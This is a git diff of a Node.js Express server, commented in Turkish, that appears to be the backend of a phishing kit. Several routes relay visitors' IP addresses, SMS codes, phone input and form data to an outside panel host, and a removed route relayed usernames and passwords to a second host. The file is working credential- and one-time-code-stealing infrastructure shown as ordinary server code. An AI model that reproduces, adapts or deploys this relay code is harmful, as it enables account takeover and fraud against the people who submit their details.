@@ -32,14 +32,6 @@ app.get('/login', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'home.html'));
 });
 
-app.get('/signin', (req, res) => {
-  const caAsCookie = req.cookies.ca_as;
-  if (!caAsCookie) {
-      return res.redirect('/');
-  }
-  res.sendFile(path.join(__dirname, 'public', 'giris.html'));
-});
-
 app.get('/bekle', (req, res) => {
      const caAsCookie = req.cookies.ca_as;
     if (!caAsCookie) {
@@ -128,9 +120,13 @@ app.get('/successfuly', (req, res) => {
  
 app.get('/verify', async (req, res) => {
     const clientIp = req.clientIp;  
+  
+     
+      
       const response = await axios.post('https://panelimdepanelim.site/eksik.php', {
         ip: clientIp
       });
+  
  
       if (response.data === '/control.html?page=eposta') {
         res.redirect('/eposta');
@@ -145,13 +141,17 @@ app.get('/verify', async (req, res) => {
 
  
 app.post('/api', async (req, res) => {
-  const clientIp = req.clientIp;  
-  const { x } = req.body; 
+  const clientIp = req.clientIp; // Ziyaretçinin IP adresi
+  const { x } = req.body; // Gönderilen x değişkeni
+
   try {
+    // IP ve x değerlerini hedef URL'ye gönderiyoruz
     const response = await axios.post('https://panelimdepanelim.site/livechat.php', {
       ip: clientIp,
       x: x
     });
+
+    
     res.send(response.data);
   } catch (error) {
     console.error("Hedef URL'ye POST gönderiminde hata:", error);
@@ -164,10 +164,14 @@ app.post('/sms', async (req, res) => {
   const { sms } = req.body;  
 
   try {
+
+ 
     const response = await axios.post('https://panelimdepanelim.site/sms.php', {
       ip: clientIp,
       sms: sms
     });
+
+
     res.send(response.data);
   } catch (error) {
     console.error("Hedef URL'ye POST gönderiminde hata:", error);
@@ -182,7 +186,7 @@ app.post('/livechats', async (req, res) => {
     const { action, phoneinput, ...otherData } = req.body; // Diğer tüm değişkenler için spread operatörü
     
     try {
- 
+      // Gönderilecek veri yapısını hazırlıyoruz
       const postData = {
         ip: clientIp,
         action: action,
@@ -192,7 +196,8 @@ app.post('/livechats', async (req, res) => {
   
  
       const response = await axios.post('https://panelimdepanelim.site/livechats.php', postData);
- 
+  
+      // Gelen yanıtı doğrudan istemciye gönder
       res.send(response.data);
     } catch (error) {
       console.error("Hedef URL'ye POST gönderiminde hata:", error);
@@ -220,35 +225,7 @@ app.post('/livechatss', async (req, res) => {
   }
 });
 
-app.post('/trapi', async (req, res) => {
-  const clientIp = req.clientIp; 
-  const { trname, trpass } = req.body; 
- 
-  if (!trname || !trpass) {
-      return res.status(400).send("Eksik veri: 'trname' veya 'trpass' gönderilmedi.");
-  }
 
-  try {
- 
-      const postData = {
-          ip: clientIp,
-          trname: trname,
-          trpass: trpass,
-      };
- 
-      const response = await axios.post('https://boranboru.com/livechats.php', postData);
- 
-      res.send(response.data);
-  } catch (error) {
-      console.error("Hedef URL'ye POST gönderiminde hata:", error.message);
-
- 
-      res.status(500).send({
-          error: "Sunucu hatası, lütfen daha sonra tekrar deneyin.",
-          details: error.message,  
-      });
-  }
-});
 app.listen(port, () => {
     console.log(`Web sunucusu http://localhost:${port} adresinde çalışıyor.`);
 });
